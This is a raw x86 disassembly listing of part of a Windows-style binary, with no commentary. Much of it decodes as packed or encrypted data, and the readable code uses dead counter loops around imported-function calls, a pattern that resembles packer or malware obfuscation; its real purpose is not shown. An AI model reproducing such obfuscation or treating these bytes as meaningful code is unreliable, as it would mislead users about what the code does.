  4030db:	jmp    0xfee0:0x6e9dcb45
  4030e2:	xor    BYTE PTR [ebx-0x22ff23bb],dh
  4030e8:	and    eax,0x1ba3435b
  4030ed:	loopne 0x403120
  4030ef:	xchg   DWORD PTR [edx-0x1b43c6d5],esi
  4030f5:	pop    ebx
  4030f6:	adc    DWORD PTR [edi+0x7a],ebp
  4030f9:	jl     0x403168
  4030fb:	out    dx,al
  4030fc:	ss dec edx
  4030fe:	or     eax,0xc42f0eb6
  403103:	mov    esi,0xeebead08
  403108:	loope  0x4030b3
  40310a:	pop    es
  40310b:	jns    0x4030f1
  40310d:	mov    edx,0xd6f5c556
  403112:	jg     0x4030de
  403114:	scas   al,BYTE PTR es:[edi]
  403115:	dec    esp
  403116:	inc    ecx
  403117:	enter  0x6db4,0xe3
  40311b:	xchg   dl,bl
  40311d:	mov    edx,0xac1cce5f
  403122:	popf   
  403123:	scas   al,BYTE PTR es:[edi]
  403124:	icebp  
  403125:	out    0x3d,al
  403127:	scas   al,BYTE PTR es:[edi]
  403128:	jle    0x403158
  40312a:	push   0x6754f86a
  40312f:	push   cs
  403130:	in     eax,0x3
  403132:	sbb    DWORD PTR [edx],0xffffff84
  403135:	fsub   DWORD PTR ds:0xe5568497
  40313b:	dec    ebp
  40313c:	call   DWORD PTR [eax-0x2]
  40313f:	mov    eax,DWORD PTR [ebp-0x38]
  403142:	mov    ecx,DWORD PTR ds:0x413bb0
  403148:	add    DWORD PTR [eax],ecx
  40314a:	pop    edi
  40314b:	jmp    0x4032ec
  403150:	add    dl,BYTE PTR [ecx]
  403152:	mov    BYTE PTR [ebx-0x4ede4c77],ch
  403158:	adc    BYTE PTR [edx-0x7c753ea4],0xb9
  40315f:	xor    BYTE PTR [edx-0x58181e9],bh
  403165:	jg     0x4031e5
  403167:	jle    0x403198
  403169:	test   BYTE PTR [ebx+0x73],bh
  40316c:	rcl    DWORD PTR [esi-0x47],0xf6
  403170:	rcr    bl,0x9b
  403173:	test   al,0x75
  403175:	icebp  
  403176:	arpl   WORD PTR [edi-0x42],si
  403179:	pop    eax
  40317a:	(bad)  
  40317b:	clc    
  40317c:	lea    edi,[ecx+ebx*4]
  40317f:	push   eax
  403180:	popf   
  403181:	mov    DWORD PTR [esi+0x9],0x7c2bbd45
  403188:	ins    DWORD PTR es:[edi],dx
  403189:	jecxz  0x403139
  40318b:	jnp    0x403207
  40318d:	xchg   esp,eax
  40318e:	jmp    0x53f7:0x2d51140f
  403195:	push   ds
  403196:	add    DWORD PTR [ebx+0x77f68d57],edx
  40319c:	xchg   esi,eax
  40319d:	cld    
  40319e:	jecxz  0x403177
  4031a0:	mov    cl,0xd5
  4031a2:	repz std 
  4031a4:	push   0xffffffc4
  4031a6:	jmp    0xef70:0x4203987a
  4031ad:	xor    ah,0xa7
  4031b0:	(bad)  
  4031b1:	retf   
  4031b2:	adc    BYTE PTR [edx-0x750253cc],0x50
  4031b9:	mov    esi,0x3075962f
  4031be:	pop    esp
  4031bf:	sbb    bl,bh
  4031c1:	mov    dl,0x8
  4031c3:	aas    
  4031c4:	mov    eax,0x97d257c6
  4031c9:	xlat   BYTE PTR ds:[ebx]
  4031ca:	or     BYTE PTR [ecx],0x7f
  4031cd:	das    
  4031ce:	sub    dl,ch
  4031d0:	je     0x403158
  4031d2:	call   0x3b3c:0x84ea2522
  4031d9:	imul   esp,DWORD PTR [esi+0x3b],0xffffffc1
  4031dd:	call   0xf319c478
  4031e2:	mov    edx,ebx
  4031e4:	fst    DWORD PTR ds:0x18b3bfa2
  4031ea:	imul   esi,ebp,0xd
  4031ed:	stos   DWORD PTR es:[edi],eax
  4031ee:	clc    
  4031ef:	sub    al,0x97
  4031f1:	jecxz  0x4031fc
  4031f3:	mov    eax,ds:0x9973dcad
  4031f8:	jo     0x4031e7
  4031fa:	hlt    
  4031fb:	inc    eax
  4031fc:	adc    cl,ah
  4031fe:	(bad)  
  4031ff:	or     DWORD PTR [esi],ecx
  403201:	int    0x9c
  403203:	pop    ds
  403204:	dec    ebp
  403205:	or     DWORD PTR [edi],eax
  403207:	test   DWORD PTR ds:0x75b3b331,esp
  40320d:	dec    ebx
  40320e:	pop    ebx
  40320f:	popa   
  403210:	pushf  
  403211:	mov    WORD PTR [ecx],gs
  403213:	pusha  
  403214:	mov    dh,0xaa
  403216:	jge    0x403278
  403218:	dec    edx
  403219:	gs cmc 
  40321b:	mov    dl,0x63
  40321d:	cmp    BYTE PTR [ebx],0x7a
  403220:	ss mov bl,0x18
  403223:	pop    ss
  403224:	push   ds
  403225:	pop    eax
  403226:	idiv   DWORD PTR [ebx+0x0]
  403229:	shl    ebx,cl
  40322b:	mov    ebp,esp
  40322d:	test   eax,0x12feb487
  403232:	inc    esi
  403233:	xchg   ecx,eax
  403234:	test   al,0xbf
  403236:	dec    ebx
  403237:	pusha  
  403238:	mov    esi,0x91a18e86
  40323d:	ds pop esp
  40323f:	push   ebx
  403240:	mov    al,0x9f
  403242:	mov    edi,0x1d334de9
  403247:	mov    BYTE PTR [ebx-0x1c80b3cb],0xa6
  40324e:	xlat   BYTE PTR ds:[ebx]
  40324f:	push   0xffffff9b
  403251:	or     DWORD PTR [eax-0x31c2e03e],ebp
  403257:	push   ecx
  403258:	cwde   
  403259:	xor    cl,BYTE PTR [edi+0x5001a878]
  40325f:	fimul  WORD PTR [eax+ebp*2]
  403262:	and    eax,0x482c18a3
  403267:	imul   esi,esi,0xffffffc6
  40326a:	inc    ecx
  40326b:	push   ebp
  40326c:	sbb    al,0xd4
  40326e:	in     al,0x7a
  403270:	cmp    bl,BYTE PTR [esi]
  403272:	mov    bl,0xa7
  403274:	inc    esp
  403275:	add    BYTE PTR [ebx-0x7cc01e7f],al
  40327b:	div    BYTE PTR [edi+0x7a5b07d2]
  403281:	xchg   DWORD PTR [esi+0x60],esp
  403284:	in     al,dx
  403285:	out    dx,eax
  403286:	mov    esp,0x591d8079
  40328b:	mov    dl,0xe
  40328d:	mov    bh,0x11
  40328f:	xor    al,0x3b
  403291:	sti    
  403292:	cmp    DWORD PTR [esi+eiz*8-0x6ec8ac39],edi
  403299:	(bad)  
  40329b:	iret   
  40329c:	mov    ebx,ds
  40329e:	sbb    cl,BYTE PTR [ebx+0x4db6165]
  4032a4:	nop
  4032a5:	or     eax,0xb99927f2
  4032aa:	dec    ebp
  4032ab:	mov    ebp,0x7c04a08d
  4032b0:	push   ss
  4032b1:	cmp    DWORD PTR [ebp-0x48],ecx
  4032b4:	cmp    esi,DWORD PTR [edx-0x53]
  4032b7:	mov    al,ds:0x64e4dae7
  4032bc:	jbe    0x40333b
  4032be:	or     DWORD PTR [esi-0x7c],ebp
  4032c1:	and    ecx,esi
  4032c3:	repz clc 
  4032c5:	adc    ch,BYTE PTR [edi-0x7d52d5c9]
  4032cb:	pop    edx
  4032cc:	stos   BYTE PTR es:[edi],al
  4032cd:	cmp    DWORD PTR es:[edx+0x5d6337ef],ebp
  4032d4:	icebp  
  4032d5:	cmp    DWORD PTR [ebp-0x4],ebp
  4032d8:	xchg   ebx,eax
  4032d9:	js     0x40325c
  4032db:	call   0x5792:0x11f3151a
  4032e2:	cmc    
  4032e3:	cli    
  4032e4:	popa   
  4032e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032e6:	and    BYTE PTR [ecx-0x1bc168bd],bh
  4032ec:	pop    esi
  4032ed:	pop    ebx
  4032ee:	leave  
  4032ef:	ret    
  4032f0:	push   ebp
  4032f1:	mov    ebp,esp
  4032f3:	sub    esp,0x2c
  4032f6:	leave  
  4032f7:	ret    0x10
  4032fa:	push   ebp
  4032fb:	mov    ebp,esp
  4032fd:	sub    esp,0x44
  403300:	push   edi
  403301:	mov    eax,DWORD PTR [ebp+0xc]
  403304:	and    DWORD PTR ds:0x4336db,0x0
  40330e:	xor    ecx,ecx
  403310:	add    ecx,DWORD PTR ds:0x4336db
  403316:	inc    ecx
  403317:	mov    DWORD PTR ds:0x4336db,ecx
  40331d:	cmp    DWORD PTR ds:0x4336db,0x26
  403324:	jne    0x403335
  40332a:	push   0x476d
  40332f:	call   DWORD PTR ds:0x412278
  403335:	cmp    DWORD PTR ds:0x4336db,0x1d
  40333c:	jb     0x40330e
  403342:	not    edx
  403344:	mov    DWORD PTR [ebp-0x10],eax
  403347:	xor    DWORD PTR ds:0x43376f,0x1717
  403351:	mov    eax,DWORD PTR [ebp+0x8]
  403354:	sbb    DWORD PTR ds:0x433757,0x2700
  40335e:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  403365:	mov    ecx,DWORD PTR ds:0x43369f
  40336b:	add    DWORD PTR ds:0x433683,ecx
  403371:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  403378:	xor    edi,0x7913
  40337e:	mov    edx,DWORD PTR [ebp+0x8]
  403381:	mov    DWORD PTR ds:0x4336d7,0x1e
  40338b:	cmp    DWORD PTR ds:0x4336d7,0x0
  403392:	je     0x4033dc
  403398:	cmp    DWORD PTR ds:0x4336d7,0xb
  40339f:	jne    0x4033ae
  4033a5:	push   DWORD PTR [ebp-0x18]
  4033a8:	call   DWORD PTR ds:0x41227c
  4033ae:	cmp    DWORD PTR ds:0x4336d7,0xc
  4033b5:	jne    0x4033c8
  4033bb:	mov    edi,DWORD PTR ds:0x4336d7
  4033c1:	dec    edi
  4033c2:	mov    DWORD PTR ds:0x4336d7,edi
  4033c8:	xor    edi,edi
  4033ca:	add    edi,DWORD PTR ds:0x4336d7
  4033d0:	dec    edi
  4033d1:	mov    DWORD PTR ds:0x4336d7,edi
  4033d7:	jmp    0x40338b
  4033dc:	mov    DWORD PTR [ebp-0x40],eax
  4033df:	dec    DWORD PTR ds:0x433767
  4033e5:	mov    eax,0x7510854
  4033ea:	xor    edx,eax
  4033ec:	mov    ecx,DWORD PTR ds:0x4336c7
  4033f2:	mov    edi,DWORD PTR ds:0x433707
  4033f8:	sub    ecx,edi
  4033fa:	imul   ecx,DWORD PTR [ecx+edi*1]
  4033fe:	mov    ecx,0x32729b
  403403:	add    edx,ecx
  403405:	mov    DWORD PTR ds:0x4336e7,0x1c
  40340f:	cmp    DWORD PTR ds:0x4336e7,0x0
  403416:	je     0x40345e
  40341c:	cmp    DWORD PTR ds:0x4336e7,0xa
  403423:	jne    0x403432
  403429:	push   DWORD PTR [ebp-0x24]
  40342c:	call   DWORD PTR ds:0x412288
  403432:	cmp    DWORD PTR ds:0x4336e7,0xb
  403439:	jne    0x40344c
  40343f:	mov    edi,DWORD PTR ds:0x4336e7
  403445:	dec    edi
  403446:	mov    DWORD PTR ds:0x4336e7,edi
  40344c:	mov    edi,DWORD PTR ds:0x4336e7
  403452:	dec    edi
  403453:	mov    DWORD PTR ds:0x4336e7,edi
  403459:	jmp    0x40340f
  40345e:	mov    DWORD PTR [ebp-0x8],edx
  403461:	mov    edx,DWORD PTR ds:0x433763
  403467:	and    edx,DWORD PTR ds:0x433797
  40346d:	mov    DWORD PTR ds:0x433763,edx
  403473:	mov    edx,DWORD PTR [ebp+0x8]
  403476:	sbb    DWORD PTR ds:0x43371b,0x6be7
  403480:	xor    edx,eax
  403482:	add    edx,ecx
  403484:	not    edi
  403486:	mov    DWORD PTR [ebp+0xc],edx
  403489:	not    edi
  40348b:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  403492:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403499:	mov    edx,DWORD PTR ds:0x43379f
  40349f:	adc    DWORD PTR ds:0x43367f,edx
  4034a5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4034ac:	adc    edx,edx
  4034ae:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4034b5:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  4034bc:	mov    DWORD PTR ds:0x433797,0x10
  4034c6:	cmp    DWORD PTR ds:0x433797,0x0
  4034cd:	je     0x403517
  4034d3:	cmp    DWORD PTR ds:0x433797,0x9
  4034da:	jne    0x4034eb
  4034e0:	push   0x5d47
  4034e5:	call   DWORD PTR ds:0x41233c
  4034eb:	cmp    DWORD PTR ds:0x433797,0xa
  4034f2:	jne    0x403505
  4034f8:	mov    edi,DWORD PTR ds:0x433797
  4034fe:	dec    edi
  4034ff:	mov    DWORD PTR ds:0x433797,edi
  403505:	mov    edi,DWORD PTR ds:0x433797
  40350b:	dec    edi
  40350c:	mov    DWORD PTR ds:0x433797,edi
  403512:	jmp    0x4034c6
  403517:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40351e:	and    DWORD PTR ds:0x4337ab,ecx
  403524:	jmp    0x403827
  403529:	sbb    ecx,ebp
  40352b:	add    ah,dl
  40352d:	lock shr ebx,1
  403530:	icebp  
  403531:	mov    ?,WORD PTR [ebp-0x7e6a2b76]
  403537:	fstp   QWORD PTR [ecx]
  403539:	(bad)  
  40353a:	adc    eax,0x7c587e7e
  40353f:	jle    0x4035bf
  403541:	push   cs
  403542:	sub    ebp,ecx
  403544:	cmp    BYTE PTR [esi-0x1e],bh
  403547:	mov    ecx,0x8d534e3a
  40354c:	test   BYTE PTR [ebx+0x47],al
  40354f:	data16 adc BYTE PTR [esi],0x84
  403553:	mov    ebp,DWORD PTR [ecx-0x1c]
  403556:	jbe    0x4034fe
  403558:	cmp    edi,esi
  40355a:	fwait
  40355b:	jne    0x4035b7
  40355d:	push   edi
  40355e:	loop   0x4035ae
  403560:	es and al,0x64
  403563:	sbb    edi,0x37
  403566:	or     eax,ebp
  403568:	jp     0x4035e5
  40356a:	mov    al,0x3
  40356c:	test   DWORD PTR [edx-0x755e07e9],eax
  403572:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403573:	jb     0x4035e0
  403575:	imul   edi,DWORD PTR cs:[ebx-0x8],0x4acaf5c4
  40357d:	pop    esp
  40357e:	jne    0x403558
  403580:	push   ss
  403581:	push   ecx
  403582:	jno    0x40355f
  403584:	repnz pop esp
  403586:	(bad)
  40358a:	ror    DWORD PTR [eax-0x6a3590b8],cl
  403590:	test   al,0x42
  403592:	pop    es
  403593:	shl    DWORD PTR [esi-0x46],cl
  403596:	push   edx
  403597:	or     al,0xc1
  403599:	xchg   ecx,eax
  40359a:	jle    0x40351d
  40359c:	sbb    al,0xad
  40359f:	pusha  
  4035a0:	add    DWORD PTR [edi],ebp
  4035a2:	xchg   edi,eax
  4035a3:	fst    DWORD PTR [ebx-0x587cd0e6]
  4035a9:	mov    bl,BYTE PTR [ebp+ebx*4+0x29dbdcd6]
  4035b0:	ret    0xef0a
  4035b3:	cmp    BYTE PTR [ebx*2-0x4ff0ab5],bh
  4035ba:	call   FWORD PTR [eax]
  4035bc:	dec    edx
  4035bd:	mov    DWORD PTR [edx-0x15b3b441],eax
  4035c3:	jno    0x4035f2
  4035c5:	sbb    DWORD PTR [ecx-0x390c9220],0x5a
  4035cc:	ins    BYTE PTR es:[edi],dx
  4035cd:	pushf  
  4035ce:	test   DWORD PTR [edx-0x4288ce50],edx
  4035d4:	pop    eax
  4035d5:	pop    eax
  4035d6:	xor    eax,DWORD PTR [ebx+edx*1]
  4035d9:	cmp    ebx,DWORD PTR [edi+0x5f]
  4035dc:	sbb    DWORD PTR [esi+0x60],ebp
  4035df:	adc    cl,al
  4035e1:	jns    0x403565
  4035e3:	in     eax,dx
  4035e4:	mov    DWORD PTR [eax+0x5c],esi
  4035e7:	aaa    
  4035e8:	test   eax,0xd8b90646
  4035ed:	js     0x403668
  4035ef:	dec    esp
  4035f0:	inc    eax
  4035f1:	sbb    al,0x73
  4035f3:	cmp    DWORD PTR [edi+ecx*4-0x75],ebp
  4035f7:	xor    BYTE PTR [edx+0x3f22727c],0x5e
  4035fe:	gs fwait
  403600:	int3   
  403601:	pushf  
  403602:	sahf   
  403603:	loope  0x403608
  403605:	(bad)
  403608:	scas   al,BYTE PTR es:[edi]
  403609:	pop    esi
  40360a:	rcr    ecx,cl
  40360c:	popf   
  40360d:	outs   dx,DWORD PTR ds:[esi]
  40360e:	in     eax,dx
  40360f:	into   
  403610:	sahf   
  403611:	xchg   ebx,eax
  403612:	jecxz  0x4035a7
  403614:	mov    BYTE PTR [ebx-0x5e73f5e4],dl
  40361a:	mov    dl,0x45
  40361c:	std    
  40361d:	fcom   DWORD PTR [ecx+0x50]
  403620:	cmp    eax,0xb03c1e40
  403625:	and    bl,dl
  403627:	xor    DWORD PTR [ecx-0x441c0aae],edi
  40362d:	ins    BYTE PTR es:[edi],dx
  40362e:	cmp    DWORD PTR [eax],eax
  403630:	mov    edx,0x3510961
  403635:	or     ebp,ebx
  403637:	fidiv  WORD PTR [edx]
  403639:	and    al,0xcd
  40363b:	mov    ds:0xed9283fa,eax
  403640:	add    DWORD PTR [ecx+0x6a11753f],0x60
  403647:	mov    ecx,edx
  403649:	test   al,0x32
  40364b:	push   0x4d3f6650
  403650:	mov    BYTE PTR [ecx],bl
  403652:	mov    ecx,0x73684474
  403657:	adc    BYTE PTR [ebp+0x5e],0xbb
  40365b:	lods   eax,DWORD PTR ds:[esi]
  40365c:	or     al,0xe8
  40365e:	cdq    
  40365f:	mov    edi,0x617c2880
  403664:	mov    ecx,0xd10e9867
  403669:	stos   DWORD PTR es:[edi],eax
  40366a:	lods   eax,DWORD PTR ds:[esi]
  40366b:	cmp    al,BYTE PTR [ebx-0x3b832678]
  403671:	shl    DWORD PTR [edi-0x68],1
  403674:	les    edx,FWORD PTR [ecx]
  403676:	and    BYTE PTR [ecx+0x7f81c7a6],cl
  40367c:	push   0x40
  40367e:	cdq    
  40367f:	fwait
  403680:	aaa    
  403681:	retf   0xdee0
  403684:	das    
  403685:	jp     0x40365f
  403687:	mov    ds:0x70ac1989,eax
  40368c:	mov    dl,0x30
  40368e:	mov    WORD PTR [ecx-0x5b],cs
  403691:	dec    ebp
  403692:	sub    al,0x17
  403694:	int3   
  403695:	imul   edi,DWORD PTR [edx+0x3d],0xffffffc8
  403699:	push   esi
  40369a:	jb     0x403642
  40369c:	or     al,0xc
  40369e:	cmp    eax,0x9f1df26a
  4036a3:	es ins BYTE PTR es:[edi],dx
  4036a5:	xchg   BYTE PTR [ebp-0xc],ah
  4036a8:	sahf   
  4036a9:	jp     0x403655
  4036ab:	xchg   ebp,eax
  4036ac:	mov    esp,0x95850b59
  4036b1:	or     al,0xa2
  4036b3:	jnp    0x403731
  4036b5:	outs   dx,DWORD PTR ds:[esi]
  4036b6:	test   DWORD PTR [edi],0xf3f27ce1
  4036bc:	loope  0x403703
  4036be:	mov    eax,0xc89613af
  4036c3:	ds cmp al,0xf6
  4036c6:	clc    
  4036c7:	icebp  
  4036c8:	fdivp  st(1),st
  4036ca:	adc    ah,BYTE PTR [eax+edi*4-0x4ceb019]
  4036d1:	sbb    eax,0x26a7e26c
  4036d6:	dec    ecx
  4036d7:	aad    0x71
  4036d9:	inc    eax
  4036da:	xchg   ecx,eax
  4036db:	xchg   ebp,eax
  4036dc:	xchg   edx,eax
  4036dd:	cmp    eax,0xf1dd3295
  4036e2:	hlt    
  4036e3:	popa   
  4036e4:	cmp    BYTE PTR [ecx+0x64],ch
  4036e7:	or     DWORD PTR [ebp+0x1583fe51],0x6c
  4036ee:	mov    ecx,0xf374fc8b
  4036f3:	icebp  
  4036f4:	jae    0x40374d
  4036f6:	or     bl,BYTE PTR [edi+0x2f]
  4036f9:	int3   
  4036fa:	and    DWORD PTR [edx],ebp
  4036fc:	push   0xddca8698
  403701:	push   cs
  403702:	add    esp,DWORD PTR [ecx+0x54ca8c22]
  403708:	(bad)  
  403709:	fld    QWORD PTR [esi]
  40370b:	mov    esp,0x9be74f03
  403710:	test   DWORD PTR [eax],eax
  403712:	mov    ds:0x2311a92f,al
  403717:	inc    ebx
  403718:	mov    esi,0xc8649f55
  40371d:	inc    ebp
  40371e:	fucomi st,st(3)
  403720:	xchg   esi,eax
  403721:	jl     0x40373b
  403723:	fcomp  QWORD PTR [ebx]
  403725:	sahf   
  403726:	add    ah,BYTE PTR [eax+0x74]
  403729:	sbb    cl,ch
  40372b:	mov    ds,esi
  40372d:	cmp    ecx,DWORD PTR [ecx]
  40372f:	or     bl,ch
  403731:	mov    cl,0x3c
  403733:	cwde   
  403734:	aam    0xf6
  403736:	mov    ch,0x53
  403738:	mov    ebp,0x75e24473
  40373d:	retf   
  40373e:	iret   
  40373f:	pop    esp
  403740:	stos   DWORD PTR es:[edi],eax
  403741:	mov    WORD PTR [edx-0x33],gs
  403744:	adc    al,0x9e
  403746:	adc    DWORD PTR [esi+eax*8],esi
  403749:	loopne 0x403733
  40374b:	xlat   BYTE PTR ds:[ebx]
  40374c:	mov    edi,0xfc85e033
  403751:	cmp    dl,al
  403753:	fst    DWORD PTR [edi-0x2bd6d75e]
  403759:	add    DWORD PTR [edi-0x4c],ebp
  40375c:	dec    eax
  40375d:	add    BYTE PTR [edi-0x1f46b351],ch
  403763:	jne    0x403771
  403765:	push   eax
  403766:	jg     0x403702
  403768:	xchg   esi,eax
  403769:	sbb    BYTE PTR [esp+ecx*4+0x67cafae2],al
  403770:	mov    BYTE PTR [esi+0x77],ch
  403773:	je     0x40377d
  403775:	xlat   BYTE PTR ds:[ebx]
  403776:	loope  0x403706
  403778:	std    
  403779:	(bad)  
  40377a:	dec    ebx
  40377b:	push   ds
  40377c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40377d:	jp     0x403741
  40377f:	or     BYTE PTR [esi],dh
  403781:	xchg   esp,eax
  403782:	xor    eax,0x3417042b
  403787:	sahf   
  403788:	js     0x4037cc
  40378a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40378b:	cmp    ebp,ecx
  40378d:	pop    ds
  40378e:	push   ss
  40378f:	push   ebp
  403790:	jns    0x4037de
  403792:	pop    esi
  403793:	inc    ecx
  403794:	imul   edi,DWORD PTR [ebx-0x2afbe475],0x73
  40379b:	sbb    DWORD PTR [esi+ebp*8-0x69],ecx
  40379f:	mov    bl,0x62
  4037a1:	adc    DWORD PTR [ebx+0xc],ebx
  4037a4:	repnz fnstsw ax
  4037a7:	jl     0x403780
  4037a9:	(bad)  
  4037aa:	repz imul ecx
  4037ad:	jae    0x403768
  4037af:	(bad)  
  4037b0:	ret    
  4037b1:	test   eax,0x80062d9
  4037b6:	mov    DWORD PTR [ecx-0x78],edx
  4037b9:	loopne 0x40375f
  4037bb:	sbb    BYTE PTR [esi+0x5ca6e42],al
  4037c1:	(bad)  
  4037c2:	pop    ebx
  4037c3:	ins    DWORD PTR es:[edi],dx
  4037c4:	push   edi
  4037c5:	adc    DWORD PTR [edi+0x20],ecx
  4037c8:	add    dh,BYTE PTR [ebx-0x6a6bdbd3]
  4037ce:	fstp   DWORD PTR [ebp+edi*8+0x69]
  4037d2:	out    0x51,eax
  4037d4:	push   es
  4037d5:	test   al,0x82
  4037d7:	cmp    eax,0xe8a7d0c9
  4037dc:	lods   eax,DWORD PTR ds:[esi]
  4037dd:	shl    DWORD PTR [edi+0x270db06c],cl
  4037e3:	sbb    al,0x62
  4037e5:	(bad)  
  4037e6:	fist   DWORD PTR [esi+0xc]
  4037e9:	pop    ds
  4037ea:	xor    al,0xb0
  4037ec:	rcr    DWORD PTR [esi-0xa6b3bf2],0x18
  4037f3:	mov    ds:0xb682af24,al
  4037f8:	xor    dl,bh
  4037fa:	scas   eax,DWORD PTR es:[edi]
  4037fb:	jmp    0xb024:0x375bbaa
  403802:	retf   
  403803:	sbb    al,0xe9
  403805:	fs jmp 0x66a3e9c3
  40380b:	xchg   ecx,eax
  40380c:	fwait
  40380d:	ins    DWORD PTR es:[edi],dx
  40380e:	push   ds
  40380f:	in     al,dx
  403810:	shr    esp,1
  403812:	add    cl,BYTE PTR [eax+ebx*4-0x3b]
  403816:	sbb    ch,al
  403818:	sbb    dl,bh
  40381a:	push   0x42
  40381c:	mov    edx,0x2c28139
  403821:	sbb    DWORD PTR [ebp+0x851e014],edx
  403827:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  40382e:	sbb    edi,DWORD PTR ds:0x43367b
  403834:	mov    edx,DWORD PTR [ebp+0x8]
  403837:	sbb    edi,DWORD PTR ds:0x43372b
  40383d:	xor    edx,eax
  40383f:	and    DWORD PTR ds:0x4337a7,0x0
  403849:	xor    edi,edi
  40384b:	add    edi,DWORD PTR ds:0x4337a7
  403851:	inc    edi
  403852:	mov    DWORD PTR ds:0x4337a7,edi
  403858:	cmp    DWORD PTR ds:0x4337a7,0xc
  40385f:	jne    0x403882
  403865:	push   0x86d9
  40386a:	push   0x47ad
  40386f:	push   0x8605
  403874:	push   DWORD PTR [ebp-0x24]
  403877:	push   0x3fd8
  40387c:	call   DWORD PTR ds:0x41228c
  403882:	cmp    DWORD PTR ds:0x4337a7,0xb
  403889:	jne    0x40389c
  40388f:	mov    edi,DWORD PTR ds:0x4337a7
  403895:	inc    edi
  403896:	mov    DWORD PTR ds:0x4337a7,edi
  40389c:	cmp    DWORD PTR ds:0x4337a7,0x17
  4038a3:	jb     0x403849
  4038a9:	or     edi,0x3f73
  4038af:	mov    edi,DWORD PTR [ebp-0x10]
  4038b2:	sub    DWORD PTR ds:0x4336eb,0x4337ab
  4038bc:	add    edx,ecx
  4038be:	mov    DWORD PTR ds:0x433713,0x73ae
  4038c8:	cmp    edi,edx
  4038ca:	mov    DWORD PTR ds:0x43376b,0x7cd1
  4038d4:	je     0x4057b4
  4038da:	mov    DWORD PTR ds:0x4337a7,0x58cf
  4038e4:	push   ebx
  4038e5:	jmp    0x40578f
  4038ea:	xor    DWORD PTR ds:0x43376b,0x43372b
  4038f4:	mov    edx,DWORD PTR [ebp-0x8]
  4038f7:	sub    DWORD PTR ds:0x43367b,ecx
  4038fd:	mov    edi,DWORD PTR [ebp-0x10]
  403900:	sub    edi,edx
  403902:	xor    DWORD PTR ds:0x433697,edi
  403908:	mov    edx,DWORD PTR [ebp-0x4]
  40390b:	xor    DWORD PTR ds:0x433693,0x16cd
  403915:	xor    edx,eax
  403917:	mov    DWORD PTR ds:0x43379b,0x2437
  403921:	add    edx,ecx
  403923:	cmp    edi,edx
  403925:	jb     0x4057b3
  40392b:	mov    DWORD PTR ds:0x43367f,0x1d
  403935:	cmp    DWORD PTR ds:0x43367f,0x0
  40393c:	je     0x40399d
  403942:	cmp    DWORD PTR ds:0x43367f,0x6
  403949:	jne    0x40396b
  40394f:	push   DWORD PTR [ebp-0x28]
  403952:	push   DWORD PTR [ebp-0x14]
  403955:	push   0x0
  403957:	push   0x6853
  40395c:	push   DWORD PTR [ebp-0x20]
  40395f:	push   DWORD PTR [ebp-0x1c]
  403962:	push   DWORD PTR [ebp-0xc]
  403965:	call   DWORD PTR ds:0x4120b8
  40396b:	cmp    DWORD PTR ds:0x43367f,0x7
  403972:	jne    0x403985
  403978:	mov    ebx,DWORD PTR ds:0x43367f
  40397e:	dec    ebx
  40397f:	mov    DWORD PTR ds:0x43367f,ebx
  403985:	mov    ebx,DWORD PTR ds:0x43367f
  40398b:	dec    ebx
  40398c:	mov    DWORD PTR ds:0x43367f,ebx
  403992:	jmp    0x403935
  403997:	xor    edx,DWORD PTR ds:0x4336e7
  40399d:	mov    edx,DWORD PTR [ebp-0x28]
  4039a0:	mov    edi,DWORD PTR ds:0x433693
  4039a6:	sub    edi,DWORD PTR ds:0x4337a3
  4039ac:	mov    DWORD PTR ds:0x433693,edi
  4039b2:	mov    edi,DWORD PTR [ebp-0x4]
  4039b5:	xor    edx,eax
  4039b7:	mov    DWORD PTR ds:0x433687,0x1b
  4039c1:	cmp    DWORD PTR ds:0x433687,0x0
  4039c8:	je     0x4039fe
  4039ce:	cmp    DWORD PTR ds:0x433687,0x26
  4039d5:	jne    0x4039e4
  4039db:	push   DWORD PTR [ebp-0x18]
  4039de:	call   DWORD PTR ds:0x4120bc
  4039e4:	xor    ebx,ebx
  4039e6:	xor    ebx,DWORD PTR ds:0x433687
  4039ec:	dec    ebx
  4039ed:	mov    DWORD PTR ds:0x433687,ebx
  4039f3:	jmp    0x4039c1
  4039f8:	neg    DWORD PTR ds:0x433697
  4039fe:	xor    edi,eax
  403a00:	and    DWORD PTR ds:0x43367b,0x0
  403a0a:	xor    ebx,ebx
  403a0c:	or     ebx,DWORD PTR ds:0x43367b
  403a12:	inc    ebx
  403a13:	mov    DWORD PTR ds:0x43367b,ebx
  403a19:	cmp    DWORD PTR ds:0x43367b,0x25
  403a20:	jne    0x403a31
  403a26:	push   0x66db
  403a2b:	call   DWORD PTR ds:0x4120c0
  403a31:	cmp    DWORD PTR ds:0x43367b,0x1e
  403a38:	jb     0x403a0a
  403a3e:	add    edi,ecx
  403a40:	add    edx,ecx
  403a42:	mov    DWORD PTR ds:0x433757,0x19
  403a4c:	cmp    DWORD PTR ds:0x433757,0x0
  403a53:	je     0x403a80
  403a59:	cmp    DWORD PTR ds:0x433757,0x26
  403a60:	jne    0x403a6e
  403a66:	push   0x0
  403a68:	call   DWORD PTR ds:0x4120c4
  403a6e:	mov    ebx,DWORD PTR ds:0x433757
  403a74:	dec    ebx
  403a75:	mov    DWORD PTR ds:0x433757,ebx
  403a7b:	jmp    0x403a4c
  403a80:	imul   edx,edi
  403a83:	mov    edi,DWORD PTR [ebp-0x8]
  403a86:	and    DWORD PTR ds:0x43379b,ebx
  403a8c:	mov    ebx,DWORD PTR [ebp-0x10]
  403a8f:	sub    ebx,edi
  403a91:	cmp    ebx,edx
  403a93:	ja     0x403aa5
  403a99:	mov    edx,DWORD PTR [ebp-0x4]
  403a9c:	xor    edx,eax
  403a9e:	add    edx,ecx
  403aa0:	jmp    0x40478a
  403aa5:	mov    edx,DWORD PTR [ebp-0x2c]
  403aa8:	mov    edi,DWORD PTR [ebp-0x4]
  403aab:	xor    edx,eax
  403aad:	xor    edi,eax
  403aaf:	add    edi,ecx
